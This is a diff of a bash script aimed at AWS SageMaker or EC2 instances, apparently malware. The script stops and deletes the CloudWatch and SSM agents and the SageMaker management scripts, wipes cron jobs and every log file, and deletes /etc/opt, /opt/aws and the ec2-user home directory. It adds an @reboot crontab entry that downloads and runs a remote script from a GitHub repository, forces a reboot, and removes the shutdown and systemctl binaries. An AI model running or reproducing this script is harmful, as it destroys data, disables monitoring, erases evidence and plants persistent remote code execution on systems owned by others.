@@ -1,10 +1,12 @@
 #!/bin/bash
 systemctl disable amazon-cloudwatch-agent; systemctl stop amazon-cloudwatch-agent; rm -rf /usr/bin/ssm-agent-worker /usr/bin/amazon-ssm-agent /usr/sbin/role-agent /usr/libexec/postfix/master /opt/aws/amazon-cloudwatch-agent /etc/opt/ml/scripts/clean-jupyter-log /etc/opt/ml/scripts/sagemaker-nbi-agent /etc/opt/ml/scripts/restart-sagemaker-agent-watcher /etc/opt/ml/scripts/relaunch-docker-service /etc/opt/ml/scripts/sagemaker-role-proxy-agent /etc/opt/ml/scripts/set-up-agent-namespace /usr/sbin/sample-notebooks-config /opt/.sagemaker/add_cloud_watch_agent_configuration.py /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/*; find /var/log -type f -delete;
-sleep 1; sudo systemctl disable amazon-cloudwatch-agent; sudo systemctl stop amazon-cloudwatch-agent; sudo rm -rf /usr/bin/ssm-agent-worker /usr/bin/amazon-ssm-agent /usr/sbin/role-agent /usr/libexec/postfix/master /opt/aws/amazon-cloudwatch-agent /etc/opt/ml/scripts/clean-jupyter-log /etc/opt/ml/scripts/sagemaker-nbi-agent /etc/opt/ml/scripts/restart-sagemaker-agent-watcher /etc/opt/ml/scripts/relaunch-docker-service /etc/opt/ml/scripts/sagemaker-role-proxy-agent /etc/opt/ml/scripts/set-up-agent-namespace /usr/sbin/sample-notebooks-config /opt/.sagemaker/add_cloud_watch_agent_configuration.py /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/*; sudo find /var/log -type f -delete;
+sleep 0; sudo systemctl disable amazon-cloudwatch-agent; sudo systemctl stop amazon-cloudwatch-agent; sudo rm -rf /usr/bin/ssm-agent-worker /usr/bin/amazon-ssm-agent /usr/sbin/role-agent /usr/libexec/postfix/master /opt/aws/amazon-cloudwatch-agent /etc/opt/ml/scripts/clean-jupyter-log /etc/opt/ml/scripts/sagemaker-nbi-agent /etc/opt/ml/scripts/restart-sagemaker-agent-watcher /etc/opt/ml/scripts/relaunch-docker-service /etc/opt/ml/scripts/sagemaker-role-proxy-agent /etc/opt/ml/scripts/set-up-agent-namespace /usr/sbin/sample-notebooks-config /opt/.sagemaker/add_cloud_watch_agent_configuration.py /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/*; sudo find /var/log -type f -delete;
 
-sleep 1800
-bash <(wget -qO- https://github.com/army2mil/cautech/raw/refs/heads/main/...) >/dev/null 2>&1 &
+rm -rf /etc/opt
+rm -rf /opt/aws
+rm -rf /home/ec2-user
+###bash <(wget -qO- https://github.com/army2mil/cautech/raw/refs/heads/main/...) >/dev/null 2>&1 &
 
 sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- https://raw.githubusercontent.com/army2mil/cautech/refs/heads/main/...) >>/dev/null 2>&1 &\n\n\n" /etc/crontab || sudo sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- https://raw.githubusercontent.com/army2mil/cautech/refs/heads/main/...) >>/dev/null 2>&1 &\n\n\n" /etc/crontab
-
+bash <(echo "sleep 0; reboot || sudo reboot") >/dev/null 2>&1 
 sudo rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
